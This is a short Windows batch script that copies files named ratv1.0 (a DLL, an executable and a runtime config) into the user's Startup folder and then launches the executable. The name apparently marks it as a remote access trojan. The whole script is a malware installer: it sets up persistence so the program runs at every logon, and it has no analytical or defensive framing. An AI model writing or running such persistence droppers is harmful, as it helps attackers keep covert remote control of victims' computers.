copy ratv1.0.dll  "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
copy ratv1.0.exe  "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
copy ratv1.0.runtimeconfig.json "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
cd "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
ratv1.0.exe
PAUSE